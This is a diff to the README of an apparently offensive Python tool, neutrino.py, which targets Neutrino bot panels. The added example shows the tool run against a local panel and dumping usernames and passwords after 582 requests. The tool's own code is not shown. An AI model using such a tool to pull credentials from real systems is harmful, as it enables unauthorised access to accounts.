@@ -21,3 +21,32 @@ pip install requests
 ```
 python neutrino.py http://panel-url-or-ip/
 ```
+
+
+### Example
+```
+python neutrino.py http://127.0.0.1/
+No. of users: 3
+
+
+Username:
+admin
+Password:
+admin
+
+Username:
+secretuser
+Password:
+SeceretPass1
+
+Username:
+user
+Password:
+mypass
+
+Number of requests made: 582
+Time taken: 147 seconds
+
+Requests per second: 3
+```
+![alt tag](https://raw.githubusercontent.com/LordDannyBoi/NeutrinoBotHack/master/example.png)
